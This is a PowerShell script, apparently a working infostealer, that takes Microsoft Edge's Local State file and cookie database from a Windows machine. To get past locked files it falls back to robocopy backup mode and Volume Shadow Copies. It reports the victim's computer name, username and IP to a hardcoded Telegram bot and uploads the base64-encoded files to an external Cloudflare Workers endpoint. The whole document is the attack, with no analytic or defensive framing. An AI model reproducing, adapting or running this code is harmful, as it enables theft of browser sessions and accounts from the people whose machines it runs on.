# steal.ps1
# Exfiltrates Edge Local State and Cookies.db using VSS for locked files.

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$worker_url = "https://reciever.tyceno89.workers.dev"

# --- Send PC info to Telegram ---
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body

# --- Function to copy with fallbacks (including VSS) ---
function Copy-FileWithFallback {
    param($src, $dst)
    # 1) Normal copy
    try { Copy-Item $src $dst -Force -ErrorAction Stop; return $true } catch {}
    # 2) robocopy /B (backup mode, requires admin)
    try {
        $src_dir = Split-Path $src
        $src_file = Split-Path $src -Leaf
        $dst_dir = Split-Path $dst
        robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
        if (Test-Path $dst) { return $true }
    } catch {}
    # 3) Volume Shadow Copy (vssadmin) – works on all Windows 10/11
    try {
        # Create a shadow copy of C: drive
        $shadow_output = vssadmin create shadow /for=C: 2>&1
        if ($LASTEXITCODE -eq 0 -and $shadow_output -match "Shadow Copy ID: \{(.*)\}") {
            $shadow_id = $matches[1]
            $shadow_path = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$shadow_id\"
            # Build the shadow path for the source file
            $src_shadow = $src -replace '^C:\\', $shadow_path
            Copy-Item $src_shadow $dst -Force -ErrorAction Stop
            # Delete the shadow copy
            vssadmin delete shadows /shadow=$shadow_id /quiet | Out-Null
            return $true
        }
    } catch {}
    return $false
}

$temp = "$env:TEMP\exfil"
New-Item -ItemType Directory -Force -Path $temp | Out-Null

$src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
$dst_ls = "$temp\Edge_LocalState.json"
$src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$dst_cookies = "$temp\Edge_Cookies.db"

$ls_ok = Copy-FileWithFallback $src_ls $dst_ls
$cookies_ok = Copy-FileWithFallback $src_cookies $dst_cookies

if (-not $ls_ok) {
    $body = @{ chat_id = $c; text = "ERROR: Could not copy Local State" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
}
if (-not $cookies_ok) {
    $body = @{ chat_id = $c; text = "ERROR: Could not copy Cookies.db" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
}

if ($ls_ok -and $cookies_ok) {
    $bytes_ls = [System.IO.File]::ReadAllBytes($dst_ls)
    $b64_ls = [Convert]::ToBase64String($bytes_ls)
    $bytes_cookies = [System.IO.File]::ReadAllBytes($dst_cookies)
    $b64_cookies = [Convert]::ToBase64String($bytes_cookies)
    
    $payload = @{
        pc = $env:COMPUTERNAME
        user = $env:USERNAME
        files = @{
            "Edge_LocalState.json" = $b64_ls
            "Edge_Cookies.db" = $b64_cookies
        }
    } | ConvertTo-Json -Depth 10
    
    try {
        Invoke-RestMethod -Uri $worker_url -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
        $body = @{ chat_id = $c; text = "Both files sent successfully" }
    } catch {
        $body = @{ chat_id = $c; text = "ERROR sending to worker: $_" }
    }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
}

# Cleanup
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
